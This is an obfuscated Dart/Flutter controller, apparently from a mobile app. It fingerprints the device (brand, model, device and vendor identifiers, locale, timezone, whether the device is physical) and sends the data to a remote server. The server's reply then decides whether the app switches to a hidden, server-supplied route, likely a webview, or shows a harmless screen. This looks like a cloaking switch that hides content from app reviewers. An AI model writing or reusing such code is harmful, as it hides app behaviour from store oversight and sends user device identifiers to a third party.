import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var vmhydpx = RxBool(false);
  var yatskzxo = RxBool(true);
  var ipkj = RxString("");
  var lester = RxBool(false);
  var larson = RxBool(true);
  final ygxukidno = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ohcmp();
  }


  Future<void> ohcmp() async {

    lester.value = true;
    larson.value = true;
    yatskzxo.value = false;

    ygxukidno.post("https://ep.gryffinbl.live/KRWwJf33Kq0U6N",data: await bligoz()).then((value) {
      var fisxrw = value.data["fisxrw"] as String;
      var ntkaj = value.data["ntkaj"] as bool;
      if (ntkaj) {
        ipkj.value = fisxrw;
        gay();
      } else {
        hane();
      }
    }).catchError((e) {
      yatskzxo.value = true;
      larson.value = true;
      lester.value = false;
    });
  }

  Future<Map<String, dynamic>> bligoz() async {
    final DeviceInfoPlugin rlxoqahz = DeviceInfoPlugin();
    PackageInfo jqldkvhu_ltjexbf = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var mqdybaer = Platform.localeName;
    var KMfNHeE = currentTimeZone;

    var cBImk = jqldkvhu_ltjexbf.packageName;
    var hzLAkeW = jqldkvhu_ltjexbf.version;
    var ckjO = jqldkvhu_ltjexbf.buildNumber;

    var QtKrCMwb = jqldkvhu_ltjexbf.appName;
    var montyCarroll = "";
    var jaquanToy = "";
    var qgmf  = "";
    var IVNZ = "";
    var claudDuBuque = "";
    var erlingAbshire = "";


    var HkNm = "";
    var yofsezIx = "";
    var rQEJmAZe = false;

    if (GetPlatform.isAndroid) {
      yofsezIx = "android";
      var leqdaxf = await rlxoqahz.androidInfo;

      IVNZ = leqdaxf.brand;

      HkNm  = leqdaxf.model;
      qgmf = leqdaxf.id;

      rQEJmAZe = leqdaxf.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      yofsezIx = "ios";
      var jipmsvb = await rlxoqahz.iosInfo;
      IVNZ = jipmsvb.name;
      HkNm = jipmsvb.model;

      qgmf = jipmsvb.identifierForVendor ?? "";
      rQEJmAZe  = jipmsvb.isPhysicalDevice;
    }
    var res = {
      "yofsezIx": yofsezIx,
      "QtKrCMwb": QtKrCMwb,
      "cBImk": cBImk,
      "HkNm": HkNm,
      "KMfNHeE": KMfNHeE,
      "erlingAbshire" : erlingAbshire,
      "IVNZ": IVNZ,
      "qgmf": qgmf,
      "mqdybaer": mqdybaer,
      "ckjO": ckjO,
      "rQEJmAZe": rQEJmAZe,
      "claudDuBuque" : claudDuBuque,
      "montyCarroll" : montyCarroll,
      "hzLAkeW": hzLAkeW,
      "jaquanToy" : jaquanToy,

    };
    return res;
  }

  Future<void> hane() async {
    Get.offAllNamed("/fileTab");
  }

  Future<void> gay() async {
    Get.offAllNamed("/fileSet");
  }

}
